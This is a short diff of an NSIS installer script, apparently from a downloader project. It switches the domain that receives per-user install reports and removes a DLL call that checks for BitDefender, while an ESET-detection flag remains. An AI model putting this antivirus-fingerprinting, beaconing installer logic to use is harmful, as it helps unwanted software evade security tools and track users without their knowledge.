@@ -14,7 +14,7 @@ SetCompressor zlib
 
 RequestExecutionLevel admin
 
-!addplugindir "d:\Regular.Downloader\AutoCompile\Source"
+!addplugindir "plugins"
 
 
 Var Result
@@ -74,7 +74,7 @@ Function .onInit
     
     Banner::show "initialization..."
     
-    StrCpy $MainDomain "ourappstore.com"
+    StrCpy $MainDomain "appsanctity.com"
     
     StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$1&action="
     
@@ -82,14 +82,7 @@ Function .onInit
     
     StrCpy $EsetFound "false"
     
-    Call InitDll
-    
-    File /oname=$PLUGINSDIR\${utilites}.dll "D:\Regular.Downloader\AutoCompile\Source\${utilites}.dll"
-    
     Call GenerateQuant
-    
-    StrCpy $0 ""
-    CallInstDLL $DllPath\${utilites}.dll /NOUNLOAD ${CheckBitDefender}
     
     ${if} $0 == "D"
         StrCpy $INSTDIR "$PROGRAMFILES\OneUpdaterSoftware"
